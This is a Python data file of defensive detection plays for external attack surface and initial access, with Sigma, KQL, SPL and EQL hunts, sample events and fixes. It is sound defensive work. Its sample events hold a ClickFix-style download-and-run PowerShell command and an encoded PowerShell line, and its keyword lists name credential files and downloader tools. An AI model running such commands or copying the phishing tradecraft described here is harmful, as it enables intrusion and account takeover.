# Plays, part A: your attack surface, initial access, execution.
# Each play: id, sec, t (title), att (ATT&CK ids), sev, lens (how an operator sees it), sig (what it looks like in telemetry),
# logs (what you need), q (hunts by language), ev (a Sigma rule's proof: an event it must match, one it must not),
# fp (what else looks like this), fix (what removes the opportunity).

PLAYS_A = [
# ------------------------------------------------------------------ your attack surface
dict(id='bb-surface', sec='surface', t='Forgotten hosts and subdomain takeover', att=['T1584.001', 'T1596.003'], sev='high',
  lens="The first hour of any external test or bug-bounty hunt is enumeration: every hostname in Certificate Transparency logs, passive DNS and old archives. "
       "The prizes are hosts nobody owns any more — a staging app still answering, an admin panel behind no SSO — and dangling DNS: a CNAME to a cloud resource that was deleted. "
       "Anyone can register that resource name, serve content on your subdomain, read cookies scoped to the parent domain and send mail that passes your SPF.",
  sig=["A CNAME to *.azurewebsites.net, *.cloudapp.net, *.s3.amazonaws.com, *.github.io, *.herokuapp.com, *.trafficmanager.net or a SaaS host that returns 'not found' or a provider's 'no such app' page",
       "Certificates issued for your names by a CA you do not use, or for names you do not recognise",
       "A cloud resource deleted (Azure ResourceDeletion, AWS DeleteBucket) while a DNS record still points at it"],
  logs="Certificate Transparency (crt.sh), your DNS zone exports, cloud activity logs (AzureActivity, CloudTrail).",
  q=dict(
    cli=r"""# 1. every name your certificates ever named (Certificate Transparency)
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | tr 'A-Z' 'a-z' | sed 's/^\*\.//' | sort -u > names.txt
# 2. names whose CNAME points at a cloud or SaaS host — each one must still exist and still be yours
while read n; do c=$(dig +short CNAME "$n" | head -1); [ -n "$c" ] && echo "$n -> $c"; done < names.txt \
  | grep -Ei 'azurewebsites|cloudapp|trafficmanager|blob\.core|s3[.-]|amazonaws|herokuapp|github\.io|cloudfront|fastly|pantheonsite|zendesk|shopify|ghost\.io|wpengine'
# 3. names that no longer resolve at all but are still in your zone: delete them
while read n; do dig +short "$n" | grep -q . || echo "NXDOMAIN-ish: $n"; done < names.txt""",
    kql=r"""// Azure: a web app, storage account or public IP was deleted — check no DNS record still points at it
AzureActivity
| where TimeGenerated > ago(90d)
| where OperationNameValue has_any ("MICROSOFT.WEB/SITES/DELETE", "MICROSOFT.STORAGE/STORAGEACCOUNTS/DELETE", "MICROSOFT.NETWORK/PUBLICIPADDRESSES/DELETE", "MICROSOFT.CDN/PROFILES/ENDPOINTS/DELETE")
| where ActivityStatusValue == "Success"
| project TimeGenerated, Caller, OperationNameValue, ResourceGroup, Resource = tostring(split(_ResourceId, "/")[-1])
| order by TimeGenerated desc""",
    spl=r"""index=aws sourcetype=aws:cloudtrail eventName IN (DeleteBucket, DeleteDistribution, ReleaseAddress, DeleteLoadBalancer)
| table _time userIdentity.arn eventName requestParameters.bucketName requestParameters.id requestParameters.publicIp
| sort - _time
| comment "each deleted name: grep your DNS zone for it before the day is out" """),
  fp="Resources deleted after their DNS record was removed are fine — the order matters, not the delete.",
  fix=["Delete the DNS record before the resource, never after — make it a step in the decommission checklist",
       "Weekly diff of CT-log names against your asset inventory; alert on certificates from a CA you do not use (CAA records restrict issuance)",
       "Azure: use alias records; AWS: Route 53 alias records to resources follow their lifecycle"]),

dict(id='bb-exposed', sec='surface', t='Exposed .git, .env, backups and source maps', att=['T1595.003', 'T1213'], sev='high',
  lens="Content-discovery wordlists start with the files that pay best: /.git/config (rebuild the whole repository with its history and old secrets), /.env (database passwords, API keys), "
       "backup archives (site.zip, db.sql.gz), /server-status, /actuator/env on Spring apps, and .js.map files that hand over the original front-end source with comments. "
       "A single 200 response on one of these is often a critical finding on its own.",
  sig=["Requests for these paths from one client, usually with many 404s around them (a wordlist run)",
       "Any 200 or 206 response to one of these paths — that is the actual exposure",
       "User agents of scanners (ffuf, gobuster, nuclei, dirsearch, feroxbuster) or a default Python/Go client"],
  logs="Web server, reverse-proxy or WAF access logs with path, status and user agent.",
  q=dict(
    sigma=r"""title: Request for a sensitive file on a web server
status: experimental
description: A client asked for source-control metadata, environment files, backups or debug endpoints. A 200 response is an exposure, not just a probe.
logsource:
  category: webserver
detection:
  keywords:
    - '/.git/config'
    - '/.git/HEAD'
    - '/.env'
    - '/.svn/entries'
    - '/.DS_Store'
    - '/actuator/env'
    - '/actuator/heapdump'
    - '/server-status'
    - '/wp-config.php.bak'
    - '/backup.zip'
    - '/.aws/credentials'
  condition: keywords
falsepositives:
  - Your own external scanner or bug-bounty researchers in scope
level: medium
tags:
  - attack.reconnaissance
  - attack.t1595.003""",
    spl=r"""index=web (uri_path="*/.git/*" OR uri_path="*/.env" OR uri_path="*/.svn/*" OR uri_path="*/actuator/*" OR uri_path="*/server-status" OR uri_path="*.map" OR uri_path="*.sql.gz" OR uri_path="*.bak")
| stats count values(uri_path) as paths values(status) as codes by src_ip, http_user_agent
| eval exposed=if(mvfind(codes, "^20[06]$")>=0, "YES - fix now", "probe only")
| sort - exposed, - count""",
    kql=r"""// Azure Application Gateway / Front Door WAF and access logs
AzureDiagnostics
| where Category in ("ApplicationGatewayAccessLog", "FrontDoorAccessLog")
| extend uri = requestUri_s, status = toint(coalesce(httpStatus_d, httpStatusCode_d))
| where uri has_any ("/.git/", "/.env", "/.svn/", "/actuator/", "/server-status", ".sql", ".bak") or uri endswith ".map"
| summarize hits = count(), paths = make_set(uri, 20), ok = countif(status in (200, 206)) by clientIP_s
| order by ok desc, hits desc"""),
  ev=['GET /.git/config HTTP/1.1 status=200 src=198.51.100.9 ua="Mozilla/5.0 (compatible; Nuclei)"', 'GET /assets/app.css HTTP/1.1 status=200 src=198.51.100.9'],
  fp="Your own scanners, CDN health checks for /server-status from localhost, and source maps you publish on purpose.",
  fix=["Deny dot-files at the web server (location ~ /\\. { deny all; }) and keep build output free of .git and .env",
       "Do not ship .map files to production, or serve them only to authenticated developers",
       "Run the same wordlist against your own sites in CI (nuclei exposures templates) and fail the build on a 200"]),

dict(id='bb-recon', sec='surface', t='Being scanned and enumerated', att=['T1595.001', 'T1595.002'], sev='low',
  lens="Before an exploit is fired the target is fingerprinted: port scans, directory brute force, parameter fuzzing and vulnerability templates. "
       "Most of this is internet background noise, but scanning that is aimed at you — your hostnames, your login path, your product's version endpoint — "
       "the day after a CVE drops is a warning worth reading.",
  sig=["One source producing hundreds of distinct 404 paths in minutes",
       "Scanner user agents (sqlmap, nikto, Nuclei, ffuf, gobuster, zgrab, masscan) or obviously fake ones",
       "Requests for the version or login endpoint of a product with a fresh KEV entry"],
  logs="Web/WAF access logs; firewall deny logs; GreyNoise to separate background noise from targeting.",
  q=dict(
    sigma=r"""title: Web vulnerability scanner user agent
status: stable
logsource:
  category: webserver
detection:
  keywords:
    - 'sqlmap'
    - 'Nikto'
    - 'Nuclei'
    - 'Fuzz Faster U Fool'
    - 'gobuster'
    - 'feroxbuster'
    - 'dirsearch'
    - 'zgrab'
    - 'masscan'
    - 'WPScan'
  condition: keywords
falsepositives:
  - Authorised scanning; bug-bounty researchers who identify themselves
level: low
tags:
  - attack.reconnaissance
  - attack.t1595.002""",
    kql=r"""// IIS: one client walking through many paths that do not exist
W3CIISLog
| where TimeGenerated > ago(1d) and scStatus == 404
| summarize misses = count(), paths = dcount(csUriStem), sample = make_set(csUriStem, 10) by cIP, bin(TimeGenerated, 10m)
| where paths > 150
| order by paths desc""",
    spl=r"""index=web status=404 earliest=-24h
| bin _time span=10m
| stats dc(uri_path) as paths count as misses values(http_user_agent) as ua by _time src_ip
| where paths > 150
| lookup greynoise_lookup ip as src_ip OUTPUT classification
| sort - paths"""),
  ev=['GET /index.php?id=1%27 HTTP/1.1 status=500 ua="sqlmap/1.8.4#stable (https://sqlmap.org)"', 'GET /index.php HTTP/1.1 status=200 ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'],
  fp="Search-engine crawlers, uptime monitors and your own vulnerability scanner — keep their source ranges in a lookup.",
  fix=["Rate-limit and challenge clients producing bursts of 404s at the edge",
       "Hide version strings in banners and headers; remove default pages",
       "When a KEV entry lands for something you expose, search a week of logs for its paths before you patch, not after"]),

dict(id='bb-secrets', sec='surface', t='Leaked keys: found in code, then tested', att=['T1552.001', 'T1078.004'], sev='critical',
  lens="Secrets in public repositories, JavaScript bundles, mobile apps and Docker images are found by automated scanners within minutes of being pushed. "
       "The first thing done with a found AWS key is to see whose it is — a call to sts:GetCallerIdentity, which needs no permission — then to list what it can reach. "
       "That first call is your best chance to catch it.",
  sig=["sts:GetCallerIdentity as the first or only call from an access key, from an IP or ASN the key has never used",
       "An access key used from a hosting provider, VPN or Tor exit when it normally runs from your CI or one region",
       "A burst of List*/Describe* calls with many AccessDenied errors (enumerating permissions)"],
  logs="AWS CloudTrail (management events); GitHub secret-scanning alerts; Entra service principal sign-in logs.",
  q=dict(
    kql=r"""// AWS: an access key calling GetCallerIdentity from an address it has not used in the last 30 days
let known = AWSCloudTrail
  | where TimeGenerated between (ago(30d) .. ago(1d))
  | summarize by UserIdentityAccessKeyId, SourceIpAddress;
AWSCloudTrail
| where TimeGenerated > ago(1d) and EventName == "GetCallerIdentity"
| join kind=leftanti known on UserIdentityAccessKeyId, SourceIpAddress
| project TimeGenerated, UserIdentityArn, UserIdentityAccessKeyId, SourceIpAddress, UserAgent""",
    spl=r"""index=aws sourcetype=aws:cloudtrail earliest=-24h
| stats count(eval(errorCode="AccessDenied")) as denied count as calls dc(eventName) as apis values(eventName) as events by userIdentity.accessKeyId sourceIPAddress userAgent
| where mvfind(events, "GetCallerIdentity")>=0 AND (denied>10 OR apis>20)
| sort - denied""",
    sigma=r"""title: AWS key validated with GetCallerIdentity from an unfamiliar client
status: experimental
description: Leaked-key checkers call sts:GetCallerIdentity first. Review when the user agent or address is not your tooling.
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: sts.amazonaws.com
    eventName: GetCallerIdentity
  filter_known:
    userAgent|contains:
      - 'aws-sdk-go'
      - 'Terraform'
  condition: selection and not filter_known
falsepositives:
  - Developers running aws sts get-caller-identity by hand
level: low
tags:
  - attack.discovery
  - attack.t1087.004""",
    cli=r"""# your own repositories and images, before an attacker looks
gitleaks detect --source . --log-opts="--all" --report-path gitleaks.json   # whole history, not just HEAD
trufflehog github --org=YOUR-ORG --only-verified                                # only keys that still work
trivy image --scanners secret your-registry/app:latest"""),
  ev=['eventSource=sts.amazonaws.com eventName=GetCallerIdentity sourceIPAddress=185.220.101.4 userAgent="python-requests/2.31.0"', 'eventSource=sts.amazonaws.com eventName=GetCallerIdentity userAgent="aws-sdk-go/1.44 Terraform/1.7"'],
  fp="Developer CLIs and CI; scope the filter to your known user agents and egress addresses.",
  fix=["Kill long-lived access keys: SSO and roles for people, OIDC federation for CI",
       "Secret scanning with push protection on every repository; rotate on alert, then investigate",
       "Plant a canary AWS key (canarytokens.org) where an intruder would look — any use is a breach"]),

dict(id='bb-edge', sec='surface', t='Edge devices: VPNs, firewalls, file-transfer appliances', att=['T1190', 'T1133'], sev='critical',
  lens="State actors have favoured edge devices since 2021: Pulse/Ivanti Connect Secure, Fortinet FortiOS, Citrix NetScaler, Palo Alto GlobalProtect, Cisco ASA and IOS XE, MOVEit and other file-transfer servers. "
       "They are internet-facing by design, run old code, have no EDR, and their logs often stay on the box. Exploitation is followed by web shells or implants on the appliance, "
       "credential harvesting from the VPN portal, and quiet tunnelling inward. Patching after compromise does not remove what was planted.",
  sig=["The appliance's own management or data-plane address making outbound connections to the internet it normally never makes",
       "VPN sessions for real users from hosting providers, with new device names, or for accounts that never use the VPN",
       "Admin logins to the appliance from addresses that are not your admin jump hosts; new local admin accounts; config exports",
       "Vendor integrity checker failures (Ivanti ICT), unexpected files in web directories, core dumps around the time of a CVE disclosure"],
  logs="Appliance syslog sent off-box (system, admin, VPN, traffic); firewall flows for the appliance's own IPs; the vendor's integrity tool.",
  q=dict(
    spl=r"""| comment "set appliance_ips to your edge devices' own addresses"
index=firewall src_ip IN ($appliance_ips$) dest_ip!=10.0.0.0/8 dest_ip!=172.16.0.0/12 dest_ip!=192.168.0.0/16 earliest=-7d
| stats count min(_time) as first max(_time) as last values(dest_port) as ports by src_ip dest_ip
| lookup known_update_servers dest_ip OUTPUT vendor
| where isnull(vendor)
| convert ctime(first) ctime(last)
| sort - count""",
    kql=r"""// Fortinet / Palo Alto / Cisco via CEF: admin activity on the device from outside the admin network
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DeviceVendor in ("Fortinet", "Palo Alto Networks", "Cisco")
| where Activity has_any ("login", "admin", "config") or DeviceEventClassID has_any ("0100032001", "0100032002")
| where not(ipv4_is_in_any_range(SourceIP, dynamic(["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])))
| summarize n = count(), acts = make_set(Activity, 10) by DeviceVendor, DeviceName, SourceIP, SourceUserName
| order by n desc""",
    cli=r"""# Ivanti Connect Secure: run the vendor's Integrity Checker Tool (external ICT) after every advisory, and keep its result
# FortiGate: look for unknown admin accounts and recent config changes
show system admin
diagnose debug config-error-log read
execute log filter category event ; execute log display
# Any appliance: export and diff the running config against the last known-good copy kept off-box"""),
  fp="Vendor update and licensing servers, NTP, threat-feed downloads — allow-list them by destination, not by port.",
  fix=["Patch KEV-listed edge vulnerabilities within days; if you cannot, take the interface off the internet",
       "After any edge CVE with known exploitation: assume compromise, run the vendor integrity check, rotate every credential the device held (VPN users' passwords, LDAP bind, certificates)",
       "Ship the appliance's logs off-box in real time; restrict management interfaces to a jump network"]),

# ------------------------------------------------------------------ initial access
dict(id='ia-aitm', sec='access', t='Adversary-in-the-middle phishing and stolen session cookies', att=['T1557', 'T1539', 'T1550.004'], sev='critical',
  lens="Proxy phishing kits (Evilginx, Tycoon 2FA, the 'EvilProxy' service and many more) sit between the victim and the real login page. The victim types their password and approves MFA; "
       "the kit keeps the session cookie and the attacker replays it from their own machine. SMS, push and TOTP all fall to this. "
       "The tell is a session that was born in one place and is used from another a few minutes later.",
  sig=["A successful interactive sign-in with MFA, then the same session (SessionId) used from a different IP and ASN, often a hosting provider, within minutes",
       "Sign-ins to OfficeHome or the Microsoft 365 portal from a new country right after a click on an emailed link",
       "Entra ID Protection: 'Anomalous Token', 'Attacker in the Middle', 'Unfamiliar sign-in properties'",
       "A new inbox rule or MFA method minutes after the sign-in (what comes next)"],
  logs="Entra ID SigninLogs and AADNonInteractiveUserSignInLogs (P1/P2), Defender for Office 365 click events, proxy logs.",
  q=dict(
    kql=r"""// One session, two places: an MFA sign-in followed by use of the same session from another IP within 3 hours
let mfa = SigninLogs
  | where TimeGenerated > ago(7d) and ResultType == 0 and AuthenticationRequirement == "multiFactorAuthentication"
  | project SessionId, UserPrincipalName, firstIp = IPAddress, firstAt = TimeGenerated, firstCountry = tostring(LocationDetails.countryOrRegion), firstAsn = AutonomousSystemNumber;
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(7d) and ResultType == 0 and isnotempty(SessionId)
| join kind=inner mfa on SessionId
| where IPAddress != firstIp and TimeGenerated between (firstAt .. firstAt + 3h)
| extend country = tostring(LocationDetails.countryOrRegion)
| where country != firstCountry or AutonomousSystemNumber != firstAsn
| project firstAt, TimeGenerated, UserPrincipalName, firstIp, firstCountry, IPAddress, country, AppDisplayName, UserAgent
| order by firstAt desc""",
    spl=r"""index=azure sourcetype="azure:monitor:aad" category IN (SignInLogs, NonInteractiveUserSignInLogs) properties.status.errorCode=0
| stats dc(properties.ipAddress) as ips values(properties.ipAddress) as ip values(properties.location.countryOrRegion) as countries min(_time) as first max(_time) as last by properties.sessionId properties.userPrincipalName
| where ips > 1 AND mvcount(countries) > 1 AND (last - first) < 10800
| convert ctime(first) ctime(last)"""),
  fp="Users moving between home Wi-Fi and mobile data (same country, consumer ISPs); corporate VPN breakout in another region.",
  fix=["Phishing-resistant MFA (FIDO2 security keys, passkeys, Windows Hello for Business) — a proxy cannot relay them; start with admins",
       "Conditional Access requiring a compliant or hybrid-joined device for sensitive apps; Token Protection where supported",
       "Revoke sessions (revokeSignInSessions) and reset as one action when you confirm a case — a password reset alone leaves the stolen cookie valid"]),

dict(id='ia-devicecode', sec='access', t='Device code phishing', att=['T1566.002', 'T1528'], sev='high',
  lens="The OAuth device-code flow lets a device with no keyboard sign in: it shows a code, the user enters it at microsoft.com/devicelogin. "
       "An attacker starts the flow themselves and sends the victim the code with a pretext — a Teams meeting invite, a document to open — and the victim signs the attacker in, MFA and all. "
       "Microsoft reported the Russia-linked Storm-2372 doing exactly this at scale from 2024 into 2025.",
  sig=["Sign-ins with AuthenticationProtocol 'deviceCode' for users who have no reason to use it (not conference-room devices or CLI users)",
       "A device-code sign-in followed by token use from a different IP or a hosting ASN",
       "Device-code sign-ins to Microsoft Authentication Broker or Office apps, then device registration"],
  logs="Entra ID SigninLogs (AuthenticationProtocol, OriginalTransferMethod).",
  q=dict(
    kql=r"""SigninLogs
| where TimeGenerated > ago(30d)
| where AuthenticationProtocol == "deviceCode" or OriginalTransferMethod == "deviceCodeFlow"
| summarize n = count(), apps = make_set(AppDisplayName), ips = make_set(IPAddress), countries = make_set(tostring(LocationDetails.countryOrRegion)) by UserPrincipalName, ResultType
| order by n desc
// anyone on this list who is not a meeting-room account or a known CLI user needs a call""",
    spl=r"""index=azure sourcetype="azure:monitor:aad" category=SignInLogs properties.authenticationProtocol=deviceCode
| stats count values(properties.appDisplayName) as apps values(properties.ipAddress) as ips by properties.userPrincipalName properties.status.errorCode"""),
  fp="Azure CLI and PowerShell users on headless servers, Teams Rooms and other shared devices.",
  fix=["Conditional Access: block the device code authentication flow for everyone except a named group of devices or users",
       "Tell users: a real colleague never sends you a code to type at a Microsoft page",
       "On a confirmed case: revoke sessions and remove any device the attacker registered"]),

dict(id='ia-consent', sec='access', t='Illicit OAuth consent', att=['T1528', 'T1550.001'], sev='high',
  lens="Instead of a password, ask for permission: a phishing link opens a genuine Microsoft consent screen for an attacker-registered app requesting Mail.Read, Files.ReadWrite.All and offline_access. "
       "One click and the app reads mail for months through the API, untouched by password resets and MFA.",
  sig=["'Consent to application' in the audit log by a regular user, for an app from an unverified publisher or a tenant you do not know",
       "Consent to high-impact permissions: Mail.*, Files.*.All, MailboxSettings.ReadWrite, offline_access, full_access_as_app",
       "A new service principal followed by Graph API mail reads from a hosting IP"],
  logs="Entra ID AuditLogs; Microsoft Graph activity logs; CloudAppEvents (Defender for Cloud Apps).",
  q=dict(
    kql=r"""AuditLogs
| where TimeGenerated > ago(30d) and OperationName == "Consent to application"
| extend app = tostring(TargetResources[0].displayName), appId = tostring(TargetResources[0].id), by = tostring(InitiatedBy.user.userPrincipalName), ip = tostring(InitiatedBy.user.ipAddress)
| extend perms = tostring(TargetResources[0].modifiedProperties)
| where perms has_any ("Mail.", "Files.ReadWrite.All", "Files.Read.All", "MailboxSettings", "offline_access", "full_access_as_app", "Directory.ReadWrite")
| project TimeGenerated, by, ip, app, appId, perms
| order by TimeGenerated desc""",
    cli=r"""# Every delegated grant in the tenant, with who consented (Microsoft Graph PowerShell)
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgOauth2PermissionGrant -All | ForEach-Object {
  $sp = Get-MgServicePrincipal -ServicePrincipalId $_.ClientId
  [pscustomobject]@{App=$sp.DisplayName; Publisher=$sp.PublisherName; Verified=[bool]$sp.VerifiedPublisher.DisplayName; Scope=$_.Scope; ConsentType=$_.ConsentType; PrincipalId=$_.PrincipalId}
} | Where-Object Scope -match 'Mail|Files|offline_access' | Sort-Object Verified | Format-Table -Auto"""),
  fp="Legitimate productivity add-ins users install; most come from verified publishers and request narrow scopes.",
  fix=["Restrict user consent to verified publishers and low-impact permissions; turn on the admin consent workflow",
       "Quarterly review of all grants and app permissions; remove what nobody can explain",
       "On a confirmed case: delete the grant and the service principal, then search mail access by that app ID"]),

dict(id='ia-mfafatigue', sec='access', t='MFA fatigue and help-desk social engineering', att=['T1621', 'T1684.001', 'T1098.005'], sev='high',
  lens="With a password from a stealer log or a breach, the attacker fires push prompts until someone taps Approve — or skips that and calls the help desk as the user, "
       "asking for a password reset and a new MFA device. Scattered Spider built a business on the second; their callers research the employee on LinkedIn first and speak with confidence.",
  sig=["Many MFA denials or timeouts for one user in a short time (ResultType 500121), then a success",
       "A help-desk password reset followed within an hour by a new MFA method registration from an unfamiliar IP or country",
       "MFA phone number changed to a VoIP number; new authenticator registered on a device never seen"],
  logs="Entra ID SigninLogs and AuditLogs (security info registration); help-desk ticket system; Okta System Log.",
  q=dict(
    kql=r"""// Push fatigue: repeated MFA failures then a success for the same user within an hour
SigninLogs
| where TimeGenerated > ago(7d)
| summarize fails = countif(ResultType in (500121, 50074, 50158)), ok = countif(ResultType == 0), ips = make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)
| where fails >= 5 and ok >= 1
| order by fails desc""",
    spl=r"""| comment "Reset then register: the help-desk route"
index=azure sourcetype="azure:monitor:aad" category=AuditLogs (properties.activityDisplayName="Reset user password" OR properties.activityDisplayName="User registered security info" OR properties.activityDisplayName="Admin registered security info")
| eval user=coalesce('properties.targetResources{}.userPrincipalName', 'properties.initiatedBy.user.userPrincipalName')
| transaction user maxspan=1h startswith="Reset user password" endswith="registered security info"
| table _time user properties.initiatedBy.user.ipAddress duration"""),
  fp="A user who lost their phone and called the help desk — it should match a ticket opened by the user from a known number.",
  fix=["Number matching and additional context in push notifications (default in Microsoft Authenticator now); better, move to FIDO2",
       "Help-desk identity verification out of band: call back on the number in HR, or video with ID; never reset MFA on an inbound call alone",
       "Alert on MFA registration within an hour of a reset, and on any reset for admins"]),

dict(id='ia-teams', sec='access', t='Fake IT support over Teams and Quick Assist', att=['T1566.004', 'T1219'], sev='high',
  lens="Ransomware affiliates flood a mailbox with thousands of newsletter sign-ups, then contact the user over Microsoft Teams from an external tenant named like 'Help Desk', offering to fix the spam. "
       "The user is talked into opening Quick Assist or installing a remote tool. Microsoft described Storm-1811 doing this before deploying Black Basta in 2024.",
  sig=["A sudden flood of inbound subscription emails to one user, then an external Teams chat request from a new *.onmicrosoft.com tenant",
       "QuickAssist.exe started, followed by downloads, new scheduled tasks or a remote-management tool on the same host",
       "curl or PowerShell downloading archives right after a Quick Assist session"],
  logs="Defender for Office 365 (EmailEvents), Teams audit in OfficeActivity/CloudAppEvents, endpoint process telemetry.",
  q=dict(
    kql=r"""// Quick Assist, then a new remote tool or download within 30 minutes on the same device
let qa = DeviceProcessEvents
  | where Timestamp > ago(7d) and FileName =~ "QuickAssist.exe"
  | project DeviceId, DeviceName, qaAt = Timestamp, AccountName;
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("AnyDesk.exe", "ScreenConnect.ClientService.exe", "TeamViewer.exe", "rustdesk.exe", "curl.exe", "powershell.exe", "msiexec.exe")
| join kind=inner qa on DeviceId
| where Timestamp between (qaAt .. qaAt + 30m)
| project qaAt, Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine""",
    sigma=r"""title: Quick Assist started by a user
status: experimental
description: Quick Assist sessions are a common start of help-desk impersonation. Review when IT did not open a ticket for the user.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\QuickAssist.exe'
  condition: selection
falsepositives:
  - IT staff who really use Quick Assist (better to remove it and use a managed tool)
level: medium
tags:
  - attack.command-and-control
  - attack.t1219""",
    spl=r"""index=o365 sourcetype="o365:management:activity" Workload=MicrosoftTeams Operation IN (ChatCreated, MessageSent) CommunicationType=OneOnOne
| search ParticipantInfo.HasForeignTenantUsers=true
| stats count min(_time) as first by UserId ParticipantInfo.ParticipatingDomains{}
| sort - first"""),
  ev=['EventID=1 Image="C:\\Windows\\System32\\QuickAssist.exe" ParentImage="C:\\Windows\\explorer.exe" User="CORP\\j.okafor"', 'EventID=1 Image="C:\\Windows\\System32\\notepad.exe" ParentImage="C:\\Windows\\explorer.exe"'],
  fp="Genuine support sessions — but those should come from your managed remote-support tool, not Quick Assist.",
  fix=["Teams: restrict external access to allowed domains, or block chats from unmanaged and trial tenants",
       "Remove or block Quick Assist where IT uses another tool (it is a Store app: Get-AppxPackage *QuickAssist* | Remove-AppxPackage)",
       "Tell staff: IT never contacts you first on Teams from an outside organisation"]),

dict(id='ia-clickfix', sec='access', t='Paste-and-run lures (ClickFix, fake CAPTCHA)', att=['T1204.004', 'T1059.001'], sev='high',
  lens="A web page shows a fake CAPTCHA or browser error and tells the user to press Win+R, Ctrl+V, Enter — the page has already put a PowerShell or mshta command on the clipboard. "
       "The user runs the attacker's code themselves, past email filters and browser download warnings. Widely used since 2024 to deliver infostealers and RATs.",
  sig=["explorer.exe starting powershell.exe, mshta.exe or cmd.exe with a URL in the command line",
       "The RunMRU registry key (what was typed in Win+R) gaining a value containing powershell, mshta, curl or http",
       "Hidden-window PowerShell (-w h / -WindowStyle Hidden) fetching a script, often with a comment like '# I am not a robot - reCAPTCHA Verification ID'"],
  logs="Process creation with command line (Sysmon 1 / 4688 / EDR), registry value set (Sysmon 13).",
  q=dict(
    sigma=r"""title: Command typed into the Run dialog launches a script host or downloader
status: experimental
description: The Run dialog history gained a command with a script host or URL — the paste-and-run (ClickFix) pattern.
logsource:
  category: registry_set
  product: windows
detection:
  selection_key:
    TargetObject|contains: '\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\'
  selection_cmd:
    Details|contains:
      - 'powershell'
      - 'pwsh'
      - 'mshta'
      - 'curl'
      - 'wget'
      - 'iex'
      - 'http'
  condition: selection_key and selection_cmd
falsepositives:
  - Administrators who run scripts from Win+R (rare)
level: high
tags:
  - attack.execution
  - attack.t1204.004""",
    kql=r"""DeviceRegistryEvents
| where Timestamp > ago(30d)
| where RegistryKey has @"\Explorer\RunMRU" and ActionType == "RegistryValueSet"
| where RegistryValueData has_any ("powershell", "pwsh", "mshta", "curl", "iex", "http", "verification", "captcha")
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryValueData""",
    eql=r"""process where host.os.type == "windows" and event.type == "start" and
  process.parent.name : "explorer.exe" and
  process.name : ("powershell.exe", "pwsh.exe", "mshta.exe", "cmd.exe") and
  process.command_line : ("*http*", "*iex*", "*Invoke-Expression*", "*-w h*", "*-WindowStyle Hidden*")"""),
  ev=['EventID=13 TargetObject="HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a" Details="powershell -w h -c iex(iwr hxxp://198.51.100.7/c)\\1"', 'EventID=13 TargetObject="HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\b" Details="notepad\\1"'],
  fp="Admins who type commands into Run; developer machines.",
  fix=["Disable the Run dialog for standard users where possible (NoRun policy) and enable PowerShell Constrained Language Mode",
       "ASR rule 'Block execution of potentially obfuscated scripts' (5beb7efe-fd9a-4556-801d-275e5ffc04cc)",
       "Awareness that names the trick: no real CAPTCHA asks you to press Win+R"]),

dict(id='ia-office', sec='access', t='Office, LNK, ISO and OneNote lures', att=['T1566.001', 'T1204.002'], sev='high',
  lens="Macros are blocked by default in files from the internet since 2022, so lures moved: LNK shortcuts with a hidden PowerShell command, ISO and IMG files that drop the mark-of-the-web, "
       "OneNote pages with embedded scripts, HTML smuggling. Whatever the wrapper, the payload ends with a familiar parent starting an unfamiliar child.",
  sig=["WINWORD, EXCEL, POWERPNT, ONENOTE or OUTLOOK starting cmd, powershell, wscript, cscript, mshta, rundll32 or regsvr32",
       "explorer.exe starting powershell with -w hidden from a .lnk inside a ZIP or ISO; a new drive letter mounted from a downloaded image",
       "Script hosts running files from %TEMP%, Downloads or a mounted ISO"],
  logs="Process creation with parent and command line; file creation; ASR events (Defender 1121/1122).",
  q=dict(
    sigma=r"""title: Office application starts a shell or script host
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\ONENOTE.EXE'
      - '\OUTLOOK.EXE'
      - '\MSACCESS.EXE'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\certutil.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Line-of-business add-ins that shell out (baseline them by command line)
level: high
tags:
  - attack.initial-access
  - attack.t1566.001""",
    kql=r"""DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe", "onenote.exe", "outlook.exe", "msaccess.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "certutil.exe")
| summarize n = count(), cmds = make_set(ProcessCommandLine, 5), devices = dcount(DeviceId) by InitiatingProcessFileName, FileName
| order by devices asc   // the rare pairs first""",
    eql=r"""sequence by host.id with maxspan=2m
  [file where event.type == "creation" and file.extension : ("lnk", "iso", "img", "vhd", "one", "hta") and file.path : ("*\\Downloads\\*", "*\\Temp\\*")]
  [process where event.type == "start" and process.name : ("powershell.exe", "mshta.exe", "wscript.exe", "cmd.exe", "rundll32.exe")]"""),
  ev=['EventID=1 ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell -nop -w hidden -enc SQBFAFgA"', 'EventID=1 ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" Image="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"'],
  fp="Some finance and CAD add-ins; mail merge printing helpers. Baseline by exact command line, never by parent alone.",
